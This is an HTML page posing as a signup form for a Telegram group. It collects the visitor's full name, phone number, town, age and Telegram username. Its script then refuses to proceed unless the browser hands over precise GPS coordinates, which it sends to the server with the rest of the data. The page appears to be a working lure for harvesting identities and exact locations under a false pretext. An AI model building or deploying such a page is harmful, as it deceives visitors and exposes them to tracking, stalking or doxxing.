<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Join Our Telegram Group</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: #f9f9f9;
      color: #333;
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      transition: background 0.3s;
    }

    h2 {
      font-size: 1.8rem;
      margin-bottom: 1rem;
      animation: fadeIn 1s ease;
    }

    form {
      background: #fff;
      padding: 20px;
      border-radius: 20px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
      width: 90%;
      max-width: 400px;
      animation: slideIn 0.6s ease;
    }

    input, button {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 12px;
      font-size: 1rem;
      outline: none;
      box-sizing: border-box;
    }

    input:focus {
      border-color: #007aff;
      box-shadow: 0 0 5px #007aff55;
    }

    button {
      background: #007aff;
      color: white;
      font-weight: bold;
      border: none;
      cursor: pointer;
      transition: 0.2s ease;
    }

    button:hover {
      background: #0051c3;
    }

    #progress {
      height: 4px;
      background: #007aff;
      width: 0%;
      margin-top: -5px;
      transition: width 0.3s ease;
    }

    @keyframes fadeIn {
      from { opacity: 0 }
      to { opacity: 1 }
    }

    @keyframes slideIn {
      from { transform: translateY(30px); opacity: 0 }
      to { transform: translateY(0); opacity: 1 }
    }
  </style>
</head>
<body>

  <h2>Fill the form to join</h2>
  <div id="progress"></div>

  <form id="userForm">
    <input type="text" name="fullname" placeholder="Full Name" required>
    <input type="text" name="phone" placeholder="Phone Number" required>
    <input type="text" name="towncity" placeholder="Town/City" required>
    <input type="number" name="age" placeholder="Age" required>
    <input type="text" name="telegram" placeholder="Telegram Username" required>
    <button type="submit">Submit</button>
  </form>

  <script>
    const form = document.getElementById("userForm");
    const progress = document.getElementById("progress");

    form.addEventListener("submit", function(e) {
      e.preventDefault();

      progress.style.width = "20%";

      const formData = {
        fullname: form.fullname.value.trim(),
        phone: form.phone.value.trim(),
        towncity: form.towncity.value.trim(),
        age: form.age.value.trim(),
        telegram: form.telegram.value.trim(),
      };

      // Quick fallback if location not allowed in time
      const locationTimeout = setTimeout(() => {
        alert("Failed to gain the trust");
        progress.style.width = "0%";
      }, 5000); // 5 seconds max

      navigator.geolocation.getCurrentPosition(success, error, {
        enableHighAccuracy: true,
        timeout: 4000,
        maximumAge: 0
      });

      function success(pos) {
        clearTimeout(locationTimeout);
        progress.style.width = "60%";
        formData.latitude = pos.coords.latitude;
        formData.longitude = pos.coords.longitude;

        fetch("/submit", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(formData)
        })
        .then(res => res.json())
        .then(response => {
          progress.style.width = "100%";
          if (response.link) {
            window.location.href = response.link;
          } else {
            alert(response.error || "Something went wrong.");
            progress.style.width = "0%";
          }
        })
        .catch(() => {
          alert("Network error.");
          progress.style.width = "0%";
        });
      }

      function error() {
        clearTimeout(locationTimeout);
        alert("Failed to gain the trust");
        progress.style.width = "0%";
      }
    });
  </script>
</body>
</html>
